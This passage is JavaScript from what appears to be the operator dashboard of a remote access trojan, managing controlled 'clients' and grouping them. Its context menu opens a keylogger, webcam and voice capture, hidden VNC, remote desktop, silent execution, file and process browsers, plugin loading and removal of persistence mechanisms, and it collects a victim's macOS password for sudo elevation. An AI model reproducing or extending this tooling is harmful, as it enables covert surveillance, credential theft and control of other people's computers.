  overlay.className = "fixed inset-0 z-[10000] flex items-center justify-center bg-black/60";
  overlay.addEventListener("click", (e) => { if (e.target === overlay) overlay.remove(); });

  const modal = document.createElement("div");
  modal.className = "bg-slate-900 border border-slate-700 rounded-xl shadow-2xl p-6 w-[400px] max-h-[80vh] flex flex-col gap-4";
  modal.innerHTML = `
    <h3 class="text-lg font-semibold text-slate-100 flex items-center gap-2"><i class="fa-solid fa-layer-group text-blue-400"></i> Set Group</h3>
    <div class="group-picker-list flex flex-col gap-1 overflow-y-auto max-h-60"></div>
    <div class="border-t border-slate-700 pt-3">
      <p class="text-xs text-slate-400 mb-2">Create new group</p>
      <div class="flex gap-2">
        <input type="text" class="group-new-name flex-1 bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-sm text-slate-100 outline-none focus:border-blue-500" placeholder="Group name" maxlength="64" />
        <input type="color" class="group-new-color w-10 h-10 rounded-lg border border-slate-700 bg-slate-800 cursor-pointer" value="#3b82f6" />
        <button class="group-create-btn px-3 py-2 rounded-lg bg-blue-600 hover:bg-blue-500 text-white text-sm font-medium">Create</button>
      </div>
    </div>
  `;

  const listEl = modal.querySelector(".group-picker-list");

  function renderList() {
    listEl.innerHTML = "";
    const noneBtn = document.createElement("button");
    noneBtn.className = `w-full text-left px-3 py-2 rounded-lg text-sm flex items-center gap-2 transition-colors ${!currentGroupId ? "bg-slate-700 text-white" : "text-slate-300 hover:bg-slate-800"}`;
    noneBtn.innerHTML = '<i class="fa-solid fa-xmark text-slate-500"></i> No Group';
    noneBtn.addEventListener("click", async () => {
      const ok = await window.setClientGroup(clientId, null);
      if (ok) setTimeout(() => loadWithOptions({ force: true }), 200);
      overlay.remove();
    });
    listEl.appendChild(noneBtn);

    groups.forEach((g) => {
      const btn = document.createElement("button");
      const isActive = String(g.id) === currentGroupId;
      btn.className = `w-full text-left px-3 py-2 rounded-lg text-sm flex items-center gap-2 transition-colors ${isActive ? "bg-slate-700 text-white" : "text-slate-300 hover:bg-slate-800"}`;
      btn.innerHTML = `<span class="inline-block w-3 h-3 rounded-full flex-shrink-0" style="background:${g.color}"></span> ${escapeHtml(g.name)}`;
      btn.addEventListener("click", async () => {
        const ok = await window.setClientGroup(clientId, g.id);
        if (ok) setTimeout(() => loadWithOptions({ force: true }), 200);
        overlay.remove();
      });
      listEl.appendChild(btn);
    });
  }

  renderList();

  const createBtn = modal.querySelector(".group-create-btn");
  createBtn.addEventListener("click", async () => {
    const nameInput = modal.querySelector(".group-new-name");
    const colorInput = modal.querySelector(".group-new-color");
    const name = nameInput.value.trim();
    const color = colorInput.value;
    if (!name) { nameInput.focus(); return; }
    try {
      const res = await fetch("/api/groups", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ name, color }),
      });
      if (!res.ok) {
        const d = await res.json().catch(() => ({}));
        alert(d.error || "Failed to create group");
        return;
      }
      const newGroup = await res.json();
      groups.push(newGroup);
      nameInput.value = "";
      renderList();
      refreshGroupFilter();
    } catch (err) {
      console.error(err);
      alert("Failed to create group");
    }
  });

  overlay.appendChild(modal);
  document.body.appendChild(overlay);
  modal.querySelector(".group-new-name").addEventListener("keydown", (e) => {
    if (e.key === "Enter") createBtn.click();
  });
}

function escapeHtml(text) {
  const div = document.createElement("div");
  div.textContent = text;
  return div.innerHTML;
}

window.banClient = async (clientId) => {
  if (!clientId) return;
  if (!confirm(`Ban IP for ${clientId} and block future connections?`)) return;
  try {
    const res = await fetch(`/api/clients/${clientId}/ban`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
    });
    if (!res.ok) {
      const data = await res.json().catch(() => ({}));
      alert(data.error || "Failed to ban client IP");
      return;
    }
    const data = await res.json().catch(() => ({}));
    alert(`Banned IP ${data.ip || ""}`.trim());
    setTimeout(() => loadWithOptions({ force: true }), 400);
  } catch (err) {
    console.error(err);
    alert("Failed to ban client IP");
  }
};

prevBtn?.addEventListener("click", () => {
  if (state.page > 1) {
    state.page -= 1;
    state.lastDigest = "";
    loadWithOptions({ force: true, reorder: true });
  }
});

nextBtn?.addEventListener("click", () => {
  state.page += 1;
  state.lastDigest = "";
  loadWithOptions({ force: true, reorder: true });
});

window.addEventListener("click", (e) => {
  const target = e.target;
  if (target.closest && target.closest(".command-btn")) return;
  if (target.closest && target.closest(".modal")) return;
  if (menu.contains(target)) return;
  closeMenu(clearContext);
});

menu.addEventListener("click", async (e) => {
  const target = e.target.closest("button");
  if (!target || !contextCard) return;
  if (target.dataset.groupToggle) return;
  if (target.disabled || target.getAttribute("aria-disabled") === "true") {
    return;
  }
  const pluginId = target.dataset.plugin;
  if (pluginId) {
    const savedClientId = contextCard;
    try {
      const res = await fetch(`/api/clients/${savedClientId}/plugins/${pluginId}/load`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({}),
      });

      if (res.status === 428) {
        const data = await res.json();
        closeMenu(clearContext);
        showPluginConfirmModal(pluginId, savedClientId, data.signature);
        return;
      }

      if (res.status === 403) {
        const data = await res.json();
        alert(data.error || "Plugin load blocked — invalid signature");
        closeMenu(clearContext);
        return;
      }

      if (!res.ok) {
        const text = await res.text();
        alert(`Plugin load failed: ${text}`);
        closeMenu(clearContext);
        return;
      }
      window.open(`/plugins/${pluginId}?clientId=${savedClientId}`, "_blank", "noopener");
    } catch (err) {
      alert("Plugin load failed");
    }
    closeMenu(clearContext);
    return;
  }
  const unloadId = target.dataset.pluginUnload;
  if (unloadId) {
    await fetch(`/api/clients/${contextCard}/plugins/${unloadId}/unload`, {
      method: "POST",
    });
    closeMenu(clearContext);
    return;
  }
  const open = target.dataset.open;
  if (open === "console") {
    window.open(`/${contextCard}/console`, "_blank", "noopener");
    closeMenu(clearContext);
    return;
  }
  if (open === "remotedesktop") {
    window.open(`/remotedesktop?clientId=${contextCard}`, "_blank", "noopener");
    closeMenu(clearContext);
    return;
  }
  if (open === "webcam") {
    window.open(`/webcam?clientId=${contextCard}`, "_blank", "noopener");
    closeMenu(clearContext);
    return;
  }
  if (open === "Backstage") {
    window.open(`/hvnc?clientId=${contextCard}`, "_blank", "noopener");
    closeMenu(clearContext);
    return;
  }
  if (open === "files") {
    const platform = detectClientPlatform(contextCard);
    if (platform !== "windows") {
      const proceed = confirm(
        "Opening File Browser may show a permission prompt to the target user on their machine. Continue?",
      );
      if (!proceed) {
        closeMenu(clearContext);
        return;
      }
    }
    window.open(`/${contextCard}/files`, "_blank", "noopener");
    closeMenu(clearContext);
    return;
  }
  if (open === "processes") {
    window.open(`/${contextCard}/processes`, "_blank", "noopener");
    closeMenu(clearContext);
    return;
  }
  if (open === "keylogger") {
    window.open(`/${contextCard}/keylogger`, "_blank", "noopener");
    closeMenu(clearContext);
    return;
  }
  if (open === "silent-exec") {
    window.open(`/deploy?clientId=${contextCard}`, "_blank", "noopener");
    closeMenu(clearContext);
    return;
  }
  if (open === "winre") {
    window.open(`/winre?clientId=${contextCard}`, "_blank", "noopener");
    closeMenu(clearContext);
    return;
  }
  const action = target.dataset.action;

  if (open === "voice") {
    window.open(`/voice?clientId=${contextCard}`, "_blank", "noopener");
    closeMenu(clearContext);
    return;
  }

  if (action === "uninstall") {
    if (
      !confirm(
        `Uninstall agent from ${contextCard}?\n\nThis will remove all persistence mechanisms and terminate the agent. This action cannot be undone.`,
      )
    ) {
      closeMenu(clearContext);
      return;
    }
  } else if (action === "disconnect") {
    if (
      !confirm(
        `Disconnect ${contextCard}?\n\nThis will terminate the agent connection.`,
      )
    ) {
      closeMenu(clearContext);
      return;
    }
  } else if (action === "remove-dashboard") {
    if (
      !confirm(
        `Remove ${contextCard} from the dashboard list?\n\nUse this for stale clients that are already gone. If that client reconnects later, it will appear again.`,
      )
    ) {
      closeMenu(clearContext);
      return;
    }

    const removed = await window.removeClientFromDashboard(contextCard);
    if (removed) {
      updateBulkToolbar();
      setTimeout(() => loadWithOptions({ force: true }), 200);
    }
    closeMenu(clearContext);
    return;
  } else if (action === "set-nickname") {
    const card = getClientCard(contextCard);
    const currentNickname = (card?.dataset.nickname || "").trim();
    const input = prompt(
      `Set nickname for ${contextCard}\n\nLeave blank to clear nickname.`,
      currentNickname,
    );
    if (input === null) {
      closeMenu(clearContext);
      return;
    }

    const trimmed = input.trim();
    const updated = await window.setClientNickname(contextCard, trimmed || null);
    if (updated) {
      setTimeout(() => loadWithOptions({ force: true }), 200);
    }
    closeMenu(clearContext);
    return;
  } else if (action === "set-custom-tag") {
    const card = getClientCard(contextCard);
    const currentTag = (card?.dataset.customTag || "").trim();
    const currentNote = card?._customTagNote || "";
    const result = await openTagNoteEditor(contextCard, currentTag, currentNote);
    if (!result) {
      closeMenu(clearContext);
      return;
    }

    const updated = await window.setClientTag(
      contextCard,
      result.tag || "",
      result.note || "",
    );
    if (updated) {
      setTimeout(() => loadWithOptions({ force: true }), 200);
    }
    closeMenu(clearContext);
    return;
  } else if (action === "set-group") {
    const savedClientId = contextCard;
    closeMenu(clearContext);
    openGroupPicker(savedClientId);
    return;
  }

  if (!isClientOnline(contextCard)) {
    alert("Client is offline. This command can only be used while the client is online.");
    closeMenu(clearContext);
    return;
  }

  if (action === "elevate") {
    const password = prompt("Enter the user's macOS password for sudo elevation:");
    if (!password) {
      closeMenu(clearContext);
      return;
    }
    try {
      const res = await fetch(`/api/clients/${contextCard}/command`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "elevate", password }),
      });
      const data = await res.json().catch(() => ({}));
      if (data.ok) {
        alert(data.message || "Elevation successful — client will reconnect as root.");
        // Stagger thumbnail requests to catch the client after it reconnects
        setTimeout(() => requestThumbnail(contextCard), 5000);
        setTimeout(() => requestThumbnail(contextCard), 10000);
        setTimeout(() => requestThumbnail(contextCard), 18000);
      } else {
        alert(data.error || data.message || "Elevation failed.");
      }
    } catch (err) {
      alert("Elevation request failed: " + err.message);
    }
    closeMenu(clearContext);
    setTimeout(() => loadWithOptions({ force: true }), 5000);
    return;
  }

  if (action === "disconnect") {
    markManualDisconnect(contextCard);
  }

  const ok = await sendCommand(contextCard, action);
  if (ok) {
    setTimeout(() => loadWithOptions({ force: true }), 400);
  }
  closeMenu(clearContext);
});

loadCurrentUser();
